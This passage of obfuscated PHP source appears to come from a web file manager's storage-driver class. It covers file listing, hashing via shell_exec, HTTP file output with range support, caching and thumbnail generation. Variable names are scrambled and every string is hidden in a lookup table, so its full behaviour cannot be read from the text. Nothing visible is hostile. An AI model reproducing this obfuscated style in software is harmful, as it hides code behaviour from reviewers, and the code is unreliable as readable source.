$ˆÎ³çÚŞ) { } public function exist($àèı¼Û) { } public function isFile($ê÷¤¤ß×) { } public function isFolder($¼Ü…¨“) { } public function size($’á“£ƒä) { } public function info($Ë€…¹”) { } public function infoSimple($´ëãıª°) { return $this->info($´ëãıª°); } public function infoAuth($¹‰½¤·) { return $this->info($¹‰½¤·); } public function infoFull($ì‰›„•ï) { return $this->info($ì‰›„•ï); } public function infoFullSimple($–¡ş‚ÍØ) { return $this->info($–¡ş‚ÍØ); } public function infoWithChildren($±ğÀ’˜) { $¥™ÕéËÈ =& $_SERVER[øşô´çË]; static $àª¦ñ«œ = array(); if (isset($àª¦ñ«œ[$±ğÀ’˜])) { return $àª¦ñ«œ[$±ğÀ’˜]; } $¦å™ÀÔÁ = $this->info($±ğÀ’˜); if ($¦å™ÀÔÁ && $¦å™ÀÔÁ[$¥™ÕéËÈ[43]] == $¥™ÕéËÈ[88]) { $‚›ú»™ = array($¥™ÕéËÈ[89] => 0, $¥™ÕéËÈ[90] => 0, $¥™ÕéËÈ[91] => 0); $this->infoChildren($±ğÀ’˜, $‚›ú»™); $¦å™ÀÔÁ[$¥™ÕéËÈ[89]] = $‚›ú»™[$¥™ÕéËÈ[89]]; $¦å™ÀÔÁ[$¥™ÕéËÈ[92]] = array($¥™ÕéËÈ[93] => $‚›ú»™[$¥™ÕéËÈ[90]], $¥™ÕéËÈ[94] => $‚›ú»™[$¥™ÕéËÈ[91]]); $àª¦ñ«œ[$±ğÀ’˜] = $¦å™ÀÔÁ; } return $¦å™ÀÔÁ; } public function listPath($¯Çù·Ø, $ÆÙÉ¡ú± = false) { } public function has($²“ª®ü, $Ìµ§»½ = false, $ÚÂÚ‹ıÎ = false) { } public function canRead($ªƒŸğ¸Ä) { } public function canWrite($ûèºÎ•±) { } public function getContent($âıÁ’) { } public function setContent($§ß¢Œó¶, $â‹æÁ¸ = '') { } protected function infoChildren($öÈ«œÂê, &$ı¸³ƒ­¯) { $å¹¥©ì  =& $_SERVER[øşô´çË]; check_abort_echo(); $¼˜Õ’¼× = $this->listPath($öÈ«œÂê, !0); $¼˜Õ’¼× = array_merge($¼˜Õ’¼×[$å¹¥©ì [95]], $¼˜Õ’¼×[$å¹¥©ì [96]]); foreach ($¼˜Õ’¼× as $ƒµŞÚ) { if ($ƒµŞÚ[$å¹¥©ì [43]] == $å¹¥©ì [88]) { $ı¸³ƒ­¯[$å¹¥©ì [91]]++; $¶‘îşˆò = $this->getPathInner($ƒµŞÚ[$å¹¥©ì [97]]); $this->infoChildren($¶‘îşˆò, $ı¸³ƒ­¯); } else { $ı¸³ƒ­¯[$å¹¥©ì [90]]++; $ı¸³ƒ­¯[$å¹¥©ì [89]] += $ƒµŞÚ[$å¹¥©ì [89]]; } } } public function fileSubstr($ıì‰¶®, $“¶¬Ş©³, $úÍÛêà¸) { } public function listAll($ôü‡¢) { } public function listAllMake($“Ğ¼ ü, &$òš™š¤°) { $ºğëı‰ß =& $_SERVER[øşô´çË]; check_abort_echo(); $®Ğó¯ˆ = $this->listPath($“Ğ¼ ü, !0); if (!$®Ğó¯ˆ) { return; } $¶ñ÷ÈÑ£ = array_merge($®Ğó¯ˆ[$ºğëı‰ß[95]], $®Ğó¯ˆ[$ºğëı‰ß[96]]); foreach ($¶ñ÷ÈÑ£ as $¶âŒÈÈ·) { $ÅâöÜÍà = $¶âŒÈÈ·[$ºğëı‰ß[43]] == $ºğëı‰ß[88]; $¨à¾üÏÄ = array($ºğëı‰ß[97] => $¶âŒÈÈ·[$ºğëı‰ß[97]], $ºğëı‰ß[88] => $ÅâöÜÍà); if (isset($¶âŒÈÈ·[$ºğëı‰ß[89]])) { $¨à¾üÏÄ[$ºğëı‰ß[89]] = $¶âŒÈÈ·[$ºğëı‰ß[89]]; } if (isset($¶âŒÈÈ·[$ºğëı‰ß[98]])) { $¨à¾üÏÄ[$ºğëı‰ß[98]] = $¶âŒÈÈ·[$ºğëı‰ß[98]]; } if (!$ÅâöÜÍà) { $òš™š¤°[] = $¨à¾üÏÄ; continue; } $òš™š¤°[] = $¨à¾üÏÄ; $‰ÆÁÍø = $¶âŒÈÈ·[$ºğëı‰ß[97]]; $¥Ûªº« = $this->pathDriver; if (substr($¶âŒÈÈ·[$ºğëı‰ß[97]], 0, strlen($¥Ûªº«)) == $¥Ûªº«) { $‰ÆÁÍø = substr($‰ÆÁÍø, strlen($¥Ûªº«)); } $this->listAllMake($‰ÆÁÍø, $òš™š¤°); } } public function listAllSimple($ÃõùğÉ, $…ïµ©ç¶ = false) { $„Ö›§¢ = $this->listAll($ÃõùğÉ); return $this->listAllSimpleMake($„Ö›§¢, $this->getPathOuter($ÃõùğÉ), $…ïµ©ç¶); } public function listAllSimpleMake($´øğäÌä, $—Õ˜÷Óœ, $À¢æ¯ãï) { $£Í…í»¡ =& $_SERVER[øşô´çË]; $ôƒñğÜ³ = array(); $—Õ˜÷Óœ = rtrim(get_path_father($—Õ˜÷Óœ), $£Í…í»¡[8]) . $£Í…í»¡[8]; foreach ($´øğäÌä as $ıù»‚ßÎ) { $—¤À™ÁÏ = array($£Í…í»¡[97] => $ıù»‚ßÎ[$£Í…í»¡[97]], $£Í…í»¡[99] => $ıù»‚ßÎ[$£Í…í»¡[97]], $£Í…í»¡[88] => $ıù»‚ßÎ[$£Í…í»¡[88]]); if (isset($ıù»‚ßÎ[$£Í…í»¡[89]]) && !$ıù»‚ßÎ[$£Í…í»¡[88]]) { $—¤À™ÁÏ[$£Í…í»¡[89]] = $ıù»‚ßÎ[$£Í…í»¡[89]]; } if (isset($ıù»‚ßÎ[$£Í…í»¡[98]])) { $—¤À™ÁÏ[$£Í…í»¡[98]] = $ıù»‚ßÎ[$£Í…í»¡[98]]; } if (is_array($ıù»‚ßÎ[$£Í…í»¡[100]])) { $—¤À™ÁÏ[$£Í…í»¡[99]] = $ıù»‚ßÎ[$£Í…í»¡[100]][$£Í…í»¡[97]]; $—¤À™ÁÏ[$£Í…í»¡[89]] = $ıù»‚ßÎ[$£Í…í»¡[100]][$£Í…í»¡[89]]; $—¤À™ÁÏ[$£Í…í»¡[98]] = $ıù»‚ßÎ[$£Í…í»¡[100]][$£Í…í»¡[98]]; } else { if (substr($ıù»‚ßÎ[$£Í…í»¡[97]], 0, strlen($—Õ˜÷Óœ)) == $—Õ˜÷Óœ) { $—¤À™ÁÏ[$£Í…í»¡[97]] = substr($ıù»‚ßÎ[$£Í…í»¡[97]], strlen($—Õ˜÷Óœ)); } } $ÅæÂ™‚Ç = $ıù»‚ßÎ[$£Í…í»¡[88]] ? $£Í…í»¡[8] : $£Í…í»¡[12]; $—¤À™ÁÏ[$£Í…í»¡[99]] = rtrim($—¤À™ÁÏ[$£Í…í»¡[99]], $£Í…í»¡[8]) . $ÅæÂ™‚Ç; $—¤À™ÁÏ[$£Í…í»¡[97]] = $£Í…í»¡[8] . trim($—¤À™ÁÏ[$£Í…í»¡[97]], $£Í…í»¡[8]) . $ÅæÂ™‚Ç; if (!$À¢æ¯ãï) { $ê’ˆ†ÑŞ = explode($£Í…í»¡[8], trim($—¤À™ÁÏ[$£Í…í»¡[97]], $£Í…í»¡[8])); $—¤À™ÁÏ[$£Í…í»¡[97]] = $£Í…í»¡[8] . implode($£Í…í»¡[8], array_slice($ê’ˆ†ÑŞ, 1)) . $ÅæÂ™‚Ç; } $ôƒñğÜ³[] = $—¤À™ÁÏ; } return array_sort_by($ôƒñğÜ³, $£Í…í»¡[97]); } public function upload($ìÍïºÜ§, $ÑŠõ¯ê¨, $¿÷Ñé¼‹ = false, $¢¡˜³ö = REPEAT_REPLACE) { } public function uploadFileByID($½èÑêªÈ, $ªÉ©Ú¯•, $Á²÷ì) { } public function uploadFileByPath($ª‚´º´î, $×éÄ‰¯ğ, $„µÎÄĞ = array()) { } public function isUploadServer() { $Ê‹Ë½Ûï =& $_SERVER[øşô´çË]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ê‹Ë½Ûï[101]) { return !0; } return $GLOBALS[$Ê‹Ë½Ûï[6]][$Ê‹Ë½Ûï[102]][$Ê‹Ë½Ûï[103]]; } public function isFileOutServer() { $¾¡ÕÌÍş =& $_SERVER[øşô´çË]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $¾¡ÕÌÍş[101]) { return !0; } return $GLOBALS[$¾¡ÕÌÍş[6]][$¾¡ÕÌÍş[102]][$¾¡ÕÌÍş[104]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($¤Ø®òµ¯) { $¶«‰×¹„ =& $_SERVER[øşô´çË]; if (!$this->isCdnHost()) { return $¤Ø®òµ¯; } return str_replace(trim(get_url_root($¤Ø®òµ¯), $¶«‰×¹„[8]), trim($this->cdnHost, $¶«‰×¹„[8]), $¤Ø®òµ¯); } public function uploadLink($Ùì¿¯‡ï, $²úşììÄ = 0) { $Á©Óƒ =& $_SERVER[øşô´çË]; if ($this->isUploadServer()) { return; } $Ä’Éğ¸” = $this->getType(); if (!in_array($Ä’Éğ¸”, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¬Èş½Ğí = 1024 * 1024 * 10; $ÅÏÓ²ã¸ = (!$²úşììÄ ? 1 : ceil($²úşììÄ / pow(1024, 3))) * 3600 * 4; if ($²úşììÄ <= $¬Èş½Ğí) { $¶ñı‡™ = $this->uploadFormData($Ùì¿¯‡ï, $ÅÏÓ²ã¸); } else { $¶ñı‡™ = $this->uploadMultiData($Ùì¿¯‡ï, $ÅÏÓ²ã¸); } if ($¶ñı‡™) { $¶ñı‡™[$Á©Óƒ[105]] = $Ùì¿¯‡ï; $¶ñı‡™[$Á©Óƒ[106]] = $Ä’Éğ¸”; } return $¶ñı‡™; } public function uploadFormData($ıË¤Ó™, $à±Ùç« = 3600) { } public function uploadMultiData($õÍğúÚœ, $—¶Æû† = 3600) { } public function multiUploadFormData($Ğ·×ıº‘, $É¨İÁ—Ø = 3600) { return $this->uploadMultiData($Ğ·×ıº‘, $É¨İÁ—Ø); } public function download($Ÿ•Ï½©Å, $”ú¶†‡³) { } public function ext($…¤Úâ) { return get_path_ext($…¤Úâ); } public function pathThis($†–Öã×) { $Îı©Îñ½ =& $_SERVER[øşô´çË]; $†–Öã× = str_replace($Îı©Îñ½[107], $Îı©Îñ½[8], rtrim($†–Öã×, $Îı©Îñ½[8])); $« ï„àò = strrpos($†–Öã×, $Îı©Îñ½[8]); if ($« ï„àò === !1) { return $†–Öã×; } return substr($†–Öã×, $« ï„àò + 1); } public function pathFather($áúĞ‰í¯) { $åñ¯œ£ğ =& $_SERVER[øşô´çË]; $áúĞ‰í¯ = str_replace($åñ¯œ£ğ[107], $åñ¯œ£ğ[8], rtrim($áúĞ‰í¯, $åñ¯œ£ğ[8])); $–£÷Ç… = strrpos($áúĞ‰í¯, $åñ¯œ£ğ[8]); if ($–£÷Ç… === !1) { return $åñ¯œ£ğ[12]; } return substr($áúĞ‰í¯, 0, $–£÷Ç… + 1); } public function hashSimple($£¥¶ûÎ) { $ªôç—¡­ =& $_SERVER[øşô´çË]; if (!$£¥¶ûÎ) { return md5($ªôç—¡­[12]); } $°‰ë’¨ò = $this->size($£¥¶ûÎ); $åš³¢‰ = 200; $Ù’…­£ = 50; if ($°‰ë’¨ò <= $åš³¢‰ * $Ù’…­£) { return $this->hashMd5($£¥¶ûÎ) . $°‰ë’¨ò; } $Æ²¼İ´Ø = intval($°‰ë’¨ò / $Ù’…­£); $öº”×Ç = $ªôç—¡­[12]; for ($×¿£éô˜ = 0; $×¿£éô˜ < $Ù’…­£; $×¿£éô˜++) { $öº”×Ç .= $this->fileSubstr($£¥¶ûÎ, $Æ²¼İ´Ø * $×¿£éô˜, $åš³¢‰); } $öº”×Ç .= $this->fileSubstr($£¥¶ûÎ, $°‰ë’¨ò - $åš³¢‰, $åš³¢‰); return md5($öº”×Ç) . $°‰ë’¨ò; } public static $md5Cache = array(); public function hashMd5($«é©šùÑ) { if (!$«é©šùÑ) { return md5($_SERVER[øşô´çË][12]); } $«é©šùÑ = $this->iconvSystem($«é©šùÑ); if (isset(self::$md5Cache[$«é©šùÑ])) { return self::$md5Cache[$«é©šùÑ]; } self::$md5Cache[$«é©šùÑ] = $this->hashMd5Shell($«é©šùÑ); if (!self::$md5Cache[$«é©šùÑ]) { self::$md5Cache[$«é©šùÑ] = @md5_file($«é©šùÑ); } return self::$md5Cache[$«é©šùÑ]; } private function hashMd5Shell($º¡Ù¬ïÎ) { $ÓÜ£¶Ñç =& $_SERVER[øşô´çË]; if (!$º¡Ù¬ïÎ) { return md5($ÓÜ£¶Ñç[12]); } if (!function_exists($ÓÜ£¶Ñç[108])) { return !1; } $ÔÂó”ñÙ = array($ÓÜ£¶Ñç[109], $ÓÜ£¶Ñç[110]); $ôıàÒ©¬ = Cache::get($ÓÜ£¶Ñç[111]); if (!$ôıàÒ©¬) { $¾á…ĞØî = BASIC_PATH . $ÓÜ£¶Ñç[112]; $ÓáÑøå = md5_file($¾á…ĞØî); $ôıàÒ©¬ = $ÓÜ£¶Ñç[113]; foreach ($ÔÂó”ñÙ as $µÓÇ”ÆÂ) { $ÈÅœÀââ = shell_exec($µÓÇ”ÆÂ . $ÓÜ£¶Ñç[63] . escapeShell($¾á…ĞØî)); if ($ÈÅœÀââ && substr(trim($ÈÅœÀââ), 0, 32) == $ÓáÑøå) { $ôıàÒ©¬ = $µÓÇ”ÆÂ; break; } } Cache::set($ÓÜ£¶Ñç[111], $ôıàÒ©¬, 3600); } if ($ôıàÒ©¬ == $ÓÜ£¶Ñç[113]) { return !1; } $ÈÅœÀââ = shell_exec($ôıàÒ©¬ . $ÓÜ£¶Ñç[63] . escapeShell($º¡Ù¬ïÎ)); $ÈÅœÀââ = str_replace($ÓÜ£¶Ñç[114], $ÓÜ£¶Ñç[12], $ÈÅœÀââ); return substr($ÈÅœÀââ, 0, 32); } public function link($œŠ†ÕÓ») { return $œŠ†ÕÓ»; } public function fileOut($ÍÊ…Æ×ü, $Íã´¨èã = false, $ñÊ™ÕÇÏ = false, $®÷ê¬±Š = '') { $›‹Ô©ø =& $_SERVER[øşô´çË]; $this->cacheMethod(null, null); if (!$ÍÊ…Æ×ü || !$this->exist($ÍÊ…Æ×ü)) { show_json(LNG($›‹Ô©ø[115]), !1, $ñÊ™ÕÇÏ); } $ı½èŠ¹Ü = $this->getType() == $›‹Ô©ø[116]; $ÑÖ‰úùÚ = $GLOBALS[$›‹Ô©ø[6]][$›‹Ô©ø[102]][$›‹Ô©ø[117]][$›‹Ô©ø[118]]; $Ø‘Ò„è» = (double) $GLOBALS[$›‹Ô©ø[6]][$›‹Ô©ø[102]][$›‹Ô©ø[117]][$›‹Ô©ø[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $—×„˜ï« = $this->infoFull($ÍÊ…Æ×ü); $ÒÜÄÔÂ¯ = $—×„˜ï«[$›‹Ô©ø[89]]; $£İéí†“ = gmdate($›‹Ô©ø[120], $—×„˜ï«[$›‹Ô©ø[98]]); $Âøş¼á = $ñÊ™ÕÇÏ ? $ñÊ™ÕÇÏ : $this->iconvApp($—×„˜ï«[$›‹Ô©ø[42]]); $ò³ã‡±å = 0; $…äÔÍÏÜ = $ÒÜÄÔÂ¯ - 1; $ÄòÛÓ¹Ü = $this->ext($Âøş¼á); if (in_array($ÄòÛÓ¹Ü, array($›‹Ô©ø[121], $›‹Ô©ø[122], $›‹Ô©ø[123], $›‹Ô©ø[124]))) { $ÄòÛÓ¹Ü = $›‹Ô©ø[125]; } if (in_array($ÄòÛÓ¹Ü, array($›‹Ô©ø[126]))) { $ÄòÛÓ¹Ü = $›‹Ô©ø[127]; } if (!$®÷ê¬±Š) { $®÷ê¬±Š = md5($£İéí†“ . $ÒÜÄÔÂ¯); } $®÷ê¬±Š = $›‹Ô©ø[128] . $®÷ê¬±Š . $›‹Ô©ø[128]; $âÈÔÂ½ = get_file_mime($ÄòÛÓ¹Ü); $ş§±ã¡ğ = !0; $ş§±ã¡ğ = isset($_GET[$›‹Ô©ø[129]]) ? !1 : !0; if ($Íã´¨èã === !1 && !mime_support($âÈÔÂ½)) { $âÈÔÂ½ = $›‹Ô©ø[130]; } header($›‹Ô©ø[131]); header($›‹Ô©ø[132] . $âÈÔÂ½); $øÓÄ×ËÄ = rawurlencode($Âøş¼á); $øÓÄ×ËÄ = $›‹Ô©ø[128] . $øÓÄ×ËÄ . $›‹Ô©ø[133] . $øÓÄ×ËÄ; if ($Íã´¨èã) { header($›‹Ô©ø[134]); header($›‹Ô©ø[135] . $øÓÄ×ËÄ); } else { if ($ş§±ã¡ğ) { header($›‹Ô©ø[136] . $øÓÄ×ËÄ); } } $Ø”Ô’’ = 3600 * 24 * 30; header($›‹Ô©ø[137]); header($›‹Ô©ø[138]); header($›‹Ô©ø[139] . $Ø”Ô’’); header($›‹Ô©ø[140] . gmdate($›‹Ô©ø[120], time() + $Ø”Ô’’) . $›‹Ô©ø[141]); if (isset($_SERVER[$›‹Ô©ø[142]]) && strtotime($_SERVER[$›‹Ô©ø[142]]) == $—×„˜ï«[$›‹Ô©ø[98]]) { header($›‹Ô©ø[143], !0, 304); die; } if (isset($_SERVER[$›‹Ô©ø[144]]) && $_SERVER[$›‹Ô©ø[144]] == $®÷ê¬±Š) { header($›‹Ô©ø[145] . $®÷ê¬±Š, !0, 304); die; } header($›‹Ô©ø[145] . $®÷ê¬±Š); header($›‹Ô©ø[146] . $£İéí†“ . $›‹Ô©ø[141]); header($›‹Ô©ø[147] . rawurlencode($Âøş¼á)); header($›‹Ô©ø[148]); header($›‹Ô©ø[149] . $ÒÜÄÔÂ¯); header($›‹Ô©ø[150]); Hook::trigger($›‹Ô©ø[151], $ÍÊ…Æ×ü, $ÒÜÄÔÂ¯, $Âøş¼á, $ÄòÛÓ¹Ü); if (!$Íã´¨èã && $ÄòÛÓ¹Ü == $›‹Ô©ø[152]) { if ($ÒÜÄÔÂ¯ > 1024 * 1024 * 10) { die; } $—´ÛŠŒ = $this->getContent($ÍÊ…Æ×ü); $—´ÛŠŒ = Html::clearSVG($—´ÛŠŒ); header($›‹Ô©ø[153] . strlen($—´ÛŠŒ)); echo $—´ÛŠŒ; die; } $£€»…¼ = strtolower($_SERVER[$›‹Ô©ø[154]]); if ($ı½èŠ¹Ü && $£€»…¼ && $ÑÖ‰úùÚ) { if (strstr($£€»…¼, $›‹Ô©ø[155])) { header($›‹Ô©ø[156] . $ÍÊ…Æ×ü); } else { if (strstr($£€»…¼, $›‹Ô©ø[157])) { header($›‹Ô©ø[158] . $ÍÊ…Æ×ü); } else { if (strstr($£€»…¼, $›‹Ô©ø[159])) { header($›‹Ô©ø[160] . $ÍÊ…Æ×ü); } } } if ($Ø‘Ò„è») { header($›‹Ô©ø[161] . $Ø‘Ò„è»); } return; } if (isset($_SERVER[$›‹Ô©ø[162]])) { if (preg_match($›‹Ô©ø[163], $_SERVER[$›‹Ô©ø[162]], $ù¡ş†ğŠ)) { $ò³ã‡±å = intval($ù¡ş†ğŠ[1]); $ò³ã‡±å = $ò³ã‡±å <= 0 ? 0 : ($ò³ã‡±å >= $…äÔÍÏÜ ? $…äÔÍÏÜ : $ò³ã‡±å); if (!empty($ù¡ş†ğŠ[2])) { $ò³Û‘ÖÖ = intval($ù¡ş†ğŠ[2]); $…äÔÍÏÜ = $ò³Û‘ÖÖ < $ò³ã‡±å ? $ò³ã‡±å : ($ò³Û‘ÖÖ >= $…äÔÍÏÜ ? $…äÔÍÏÜ : $ò³Û‘ÖÖ); } } header($›‹Ô©ø[164]); header("\x43\x6f\156\x74\145\x6e\164\55\x52\x61\x6e\147\145\x3a\40\x62\x79\x74\x65\x73\40{$ò³ã‡±å}\55{$…äÔÍÏÜ}\57" . $ÒÜÄÔÂ¯); } else { header($›‹Ô©ø[165]); } header($›‹Ô©ø[166]); header($›‹Ô©ø[167]); $ÌİË¾½ô = !0; if ($_SERVER[$›‹Ô©ø[168]] == $›‹Ô©ø[169] && $ÒÜÄÔÂ¯ > 1204 * 1024 * 1024 * 2) { $ÌİË¾½ô = !1; } if ($ÌİË¾½ô) { header($›‹Ô©ø[170] . ($…äÔÍÏÜ - $ò³ã‡±å + 1)); } if ($_SERVER[$›‹Ô©ø[171]] == $›‹Ô©ø[172]) { return; } $ìŞô·Ä¥ = array($›‹Ô©ø[173] => !1, $›‹Ô©ø[174] => $ò³ã‡±å, $›‹Ô©ø[175] => $…äÔÍÏÜ, $›‹Ô©ø[176] => $ÄòÛÓ¹Ü, $›‹Ô©ø[177] => $—×„˜ï«, $›‹Ô©ø[178] => $›‹Ô©ø[12], $›‹Ô©ø[179] => 0); $ìŞô·Ä¥ = Hook::filter($›‹Ô©ø[180], $ìŞô·Ä¥); $É¤šË‹ = 1024 * 300; $èâŸ–ï¿ = 0; if ($Ø‘Ò„è») { $èâŸ–ï¿ = intval(1000 * 1000 * ($É¤šË‹ / $Ø‘Ò„è»)); } while ($ò³ã‡±å <= $…äÔÍÏÜ) { $±Ş£ı¶Ò = timeFloat(); check_abort(); $–ş³ÆÔ = $…äÔÍÏÜ - $ò³ã‡±å + 1; if ($–ş³ÆÔ <= $É¤šË‹) { $É¤šË‹ = $–ş³ÆÔ; } $—´ÛŠŒ = $this->fileSubstr($ÍÊ…Æ×ü, $ò³ã‡±å, $É¤šË‹); if ($ìŞô·Ä¥[$›‹Ô©ø[173]]) { $ìŞô·Ä¥[$›‹Ô©ø[178]] = $—´ÛŠŒ; $ìŞô·Ä¥[$›‹Ô©ø[179]] = $ò³ã‡±å; $ìŞô·Ä¥ = Hook::filter($›‹Ô©ø[181], $ìŞô·Ä¥); $—´ÛŠŒ = $ìŞô·Ä¥[$›‹Ô©ø[178]]; } echo $—´ÛŠŒ; $ò³ã‡±å += $É¤šË‹; if ($É¤šË‹ == $–ş³ÆÔ) { $ò³ã‡±å = $…äÔÍÏÜ + 1; } if ($èâŸ–ï¿) { $„šİÅû = intval(1000 * 1000 * (timeFloat() - $±Ş£ı¶Ò)); $øáòÚÌê = $èâŸ–ï¿ - $„šİÅû; if ($øáòÚÌê > 5) { usleep($øáòÚÌê); } } } } public function fileOutServer($³Ëşº¬‹, $…”¹ƒı = false, $ò¹õØ·å = false, $¤­ã½Ã— = '') { $this->fileOut($³Ëşº¬‹, $…”¹ƒı, $ò¹õØ·å, $¤­ã½Ã—); } public function fileOutLink($’Ë×­ÏÄ) { header($_SERVER[øşô´çË][182] . $’Ë×­ÏÄ); die; } public function cacheMethod($øñ‰é„ò, $ãüŞıÒ, $İò¸Åì = null) { $É×å›â” =& $_SERVER[øşô´çË]; static $ÚØÏ×àğ = array(); $Ÿ ãæ›ô = $ãüŞıÒ ? ltrim($this->getPathOuter($ãüŞıÒ), $É×å›â”[8]) : $É×å›â”[12]; $ä¤ÓğÊ = $É×å›â”[183] . $øñ‰é„ò . $É×å›â”[184] . rtrim($Ÿ ãæ›ô, $É×å›â”[8]); if (is_null($øñ‰é„ò)) { $ÚØÏ×àğ = array(); return; } if (is_null($ãüŞıÒ)) { foreach ($ÚØÏ×àğ as $ä¤ÓğÊ => $øá—×†ê) { if (!strstr($ä¤ÓğÊ, $É×å›â”[183] . $øñ‰é„ò . $É×å›â”[185])) { continue; } unset($ÚØÏ×àğ[$ä¤ÓğÊ]); } return; } if ($İò¸Åì === $É×å›â”[186]) { unset($ÚØÏ×àğ[$ä¤ÓğÊ]); return; } if (!is_null($İò¸Åì)) { $ÚØÏ×àğ[$ä¤ÓğÊ] = $İò¸Åì; return; } $›Ï”ŠÉÒ = isset($ÚØÏ×àğ[$ä¤ÓğÊ]) ? $ÚØÏ×àğ[$ä¤ÓğÊ] : null; if (!is_null($›Ï”ŠÉÒ)) { return $›Ï”ŠÉÒ; } $›Ï”ŠÉÒ = $this->{$øñ‰é„ò}($ãüŞıÒ); $ÚØÏ×àğ[$ä¤ÓğÊ] = $›Ï”ŠÉÒ; return $›Ï”ŠÉÒ; } public function cacheMethodInfoSet($êÈÁÃŞ, $Õ—ÚÕ‚, $Æ€ü •» = false) { $–ü¿‰ü =& $_SERVER[øşô´çË]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($–ü¿‰ü[187], $êÈÁÃŞ, $Õ—ÚÕ‚); $this->cacheMethod($–ü¿‰ü[188], $êÈÁÃŞ, $Õ—ÚÕ‚ ? !1 : !0); if (is_array($Æ€ü •»)) { $this->cacheMethod($–ü¿‰ü[189], $êÈÁÃŞ, $Æ€ü •»); } } public function fileOutImage($ƒÍæ×ŞÔ, $Å®î¥¤ù = 250) { $å»İããØ =& $_SERVER[øşô´çË]; set_timeout(); if (substr($ƒÍæ×ŞÔ, 0, 4) == $å»İããØ[159]) { $this->fileOutLink($ƒÍæ×ŞÔ); } $õ“Ù‡Ô = $this->info($ƒÍæ×ŞÔ); $¹û°ÎËğ = !1; $áÜŠÏœ• = isset($GLOBALS[$å»İããØ[190]]) ? $GLOBALS[$å»İããØ[190]] : array(); if ($áÜŠÏœ• && $áÜŠÏœ•[$å»İããØ[191]] == $õ“Ù‡Ô[$å»İããØ[97]]) { $õ“Ù‡Ô = $áÜŠÏœ•; $åÃŸœÈ‰ = $õ“Ù‡Ô[$å»İããØ[192]]; if ($åÃŸœÈ‰ && isset($åÃŸœÈ‰[$å»İããØ[193]])) { if ($åÃŸœÈ‰[$å»İããØ[193]] <= $Å®î¥¤ù && $åÃŸœÈ‰[$å»İããØ[194]] <= $Å®î¥¤ù) { $¹û°ÎËğ = !0; } } } if ($õ“Ù‡Ô[$å»İããØ[89]] <= 1024 * 50 || $¹û°ÎËğ || !function_exists($å»İããØ[195]) || $õ“Ù‡Ô[$å»İããØ[176]] == $å»İããØ[196]) { return $this->fileOut($ƒÍæ×ŞÔ, !1, $õ“Ù‡Ô[$å»İããØ[42]]); } $’°áÏÑ¯ = kodIO::hashPath($õ“Ù‡Ô); $ÛÉ…Û¸Ù = "\143\x6f\x76\145\162\x5f{$’°áÏÑ¯}\x5f{$Å®î¥¤ù}\56\160\156\x67"; $ÆƒÀ•‹ß = IO_PATH_SYSTEM_TEMP . $å»İããØ[197]; $Òöøèæ = IO::infoFullSimple($ÆƒÀ•‹ß); $éŸ¤ığ‹ = $Òöøèæ && is_array($Òöøèæ) ? $Òöøèæ[$å»İããØ[97]] : $å»İããØ[12]; if (!$éŸ¤ığ‹) { $éŸ¤ığ‹ = IO::mkdir($ÆƒÀ•‹ß); } if ($õ“Ù‡Ô[$å»İããØ[198]] == $å»İããØ[199] && isset($õ“Ù‡Ô[$å»İããØ[200]]) && $õ“Ù‡Ô[$å»İããØ[200]] == kodIO::sourceID($éŸ¤ığ‹)) { $¤ÌÎü = $õ“Ù‡Ô[$å»İããØ[201]]; if ($Å®î¥¤ù <= 500) { $¾Å¼ÎÅ÷ = preg_replace($å»İããØ[202], $å»İããØ[203], $õ“Ù‡Ô[$å»İããØ[42]]); $¤ÌÎü = IO::fileNameExist($éŸ¤ığ‹, $¾Å¼ÎÅ÷); } return IO::fileOut(KodIO::make($¤ÌÎü), !1, $õ“Ù‡Ô[$å»İããØ[42]]); } $‡Í’á»— = IO::fileNameExist($éŸ¤ığ‹, $ÛÉ…Û¸Ù); if ($‡Í’á»—) { return IO::fileOut(KodIO::make($‡Í’á»—), !1, $õ“Ù‡Ô[$å»İããØ[42]]); } if ($Å®î¥¤ù > 1000) { $this->makeImageCover($éŸ¤ığ‹, $ƒÍæ×ŞÔ, $ÛÉ…Û¸Ù, $Å®î¥¤ù); $this->makeImageCover($éŸ¤ığ‹, $ƒÍæ×ŞÔ, "\143\157\x76\x65\x72\137{$’°áÏÑ¯}\x5f\62\65\x30\x2e\160\156\x67", 250); $‡Í’á»— = IO::fileNameExist($éŸ¤ığ‹, $ÛÉ…Û¸Ù); if ($‡Í’á»—) { return IO::fileOut(KodIO::make($‡Í’á»—), !1, $õ“Ù‡Ô[$å»İããØ[42]]); } die; } if (!kodIO::allowCover($õ“Ù‡Ô)) { return $this->fileOut($ƒÍæ×ŞÔ, !1, $õ“Ù‡Ô[$å»İããØ[42]]); } $›şˆÃôŸ = Cache::get($ÛÉ…Û¸Ù); if ($›şˆÃôŸ == $å»İããØ[204] || $›şˆÃôŸ == $å»İããØ[205]) { echo $›şˆÃôŸ; die; } Cache::set($ÛÉ…Û¸Ù, $å»İããØ[205], 60); $Â·Úùùù = array($éŸ¤ığ‹, $õ“Ù‡Ô[$å»İããØ[97]], $ÛÉ…Û¸Ù, $Å®î¥¤ù); $Ší™­ëÇ = $å»İããØ[206] . $õ“Ù‡Ô[$å»İããØ[89]] . $å»İããØ[207] . $ÛÉ…Û¸Ù . $å»İããØ[208] . $õ“Ù‡Ô[$å»İããØ[42]] . $å»İããØ[209] . $õ“Ù‡Ô[$å»İããØ[97]]; TaskQueue::add($å»İããØ[210], $Â·Úùùù, $Ší™­ëÇ, $ÛÉ…Û¸Ù); } public function makeImageCover($Ë‹³ÕÖ·, $Í±­¸²÷, $ğ•–ì¸¥, $Ä¨ÏÌºä) { $¯ˆé¾‚ =& $_SERVER[øşô´çË]; if (IO::fileNameExist($Ë‹³ÕÖ·, $ğ•–ì¸¥)) { return $¯ˆé¾‚[211]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $¿³‚öÀ‹ = $this->getPathOuter($Í±­¸²÷); $ÓüÈ‡ùµ = DATA_THUMB . $ğ•–ì¸¥; del_file($ÓüÈ‡ùµ); $§­†è = IO::copy($¿³‚öÀ‹, TEMP_FILES, !1, $ğ•–ì¸¥); if (!@file_exists($§­†è)) { return $¯ˆé¾‚[212]; } 